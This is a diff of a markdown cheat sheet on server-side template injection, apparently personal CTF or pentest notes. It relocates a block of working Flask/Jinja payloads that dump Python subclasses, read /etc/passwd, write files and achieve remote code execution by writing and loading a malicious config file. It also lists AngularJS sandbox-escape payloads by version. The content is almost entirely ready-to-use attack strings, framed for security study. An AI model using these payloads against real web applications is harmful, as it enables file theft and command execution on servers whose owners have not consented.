@@ -446,8 +446,8 @@ READ SOME SSTI writeups:
 * https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo1
 * https://hackerone.com/reports/125980
 
-Finding Flask template injection:  
-```
+Flask template injection:  
+```python
 {{4+4}}
 /* Request object gives you request context: {{request.__dict__}} which tells you everything about your request.
  * This is 'server-side disclosure of info' which is a vuln category itself.
@@ -455,6 +455,22 @@ Finding Flask template injection:
  */
 {{request}}     
 {{config}}
+```
+
+More Flask/Jinja template injection:
+```python
+# Dump all used classes
+  {{ ''.__class__.__mro__[2].__subclasses__() }}
+# Read File
+  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+# Write File
+  {{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}
+# RCE
+  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+# evil config
+  {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+# load config
+  {{ config['RUNCMD']('cat flag',shell=True) }}
 ```
 
 Working AngularJS payload (EXT BREAK #2):
@@ -476,22 +492,6 @@ Angular JS:
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} v1.4.0-v1.4.9
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} v1.5.0-v1.5.8
 {{ [].pop.constructor('alert(1)')() }} 2.8 v1.6.0-1.6.6
-```
-
-Flask/Jinja:
-```
-Dump all used classes
-  {{ ''.__class__.__mro__[2].__subclasses__() }}
-Read File
-  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
-Write File
-  {{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}
-RCE
-  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
-evil config
-  {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
-load config
-  {{ config['RUNCMD']('cat flag',shell=True) }}
 ```
 
 ### ============================================================
